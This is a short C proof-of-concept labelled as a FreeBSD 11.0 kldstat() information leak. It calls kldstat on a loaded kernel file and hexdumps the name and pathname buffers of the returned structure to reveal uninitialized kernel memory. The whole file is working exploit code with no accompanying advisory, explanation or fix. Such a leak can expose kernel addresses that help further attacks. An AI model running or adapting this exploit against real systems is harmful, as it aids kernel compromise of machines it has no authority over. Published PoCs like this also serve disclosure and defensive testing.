/*
 * FreeBSD 11.0 kldstat() infoleak.  
 */

#include <stdio.h>
#include <sys/param.h>
#include <sys/linker.h>

void hexdump(unsigned char *ptr, int len) {
	int i;
	for (i=0; i< len; i++) {
		if (!(i%16) && i) {
			printf("\n");
		}
		printf("%02x ", ptr[i]);
	}
	printf("\n");
	return;
}

int main() {
	struct kld_file_stat kfs;
	memset(&kfs, 0x00, sizeof(kfs));
	kfs.version = sizeof(kfs);
	kldstat(1, &kfs);

	printf("kfs.name infoleak: \n");
	hexdump(kfs.name, MAXPATHLEN);
	
	printf("kfs.pathname infoleak: \n");
	hexdump(kfs.pathname, MAXPATHLEN);
}
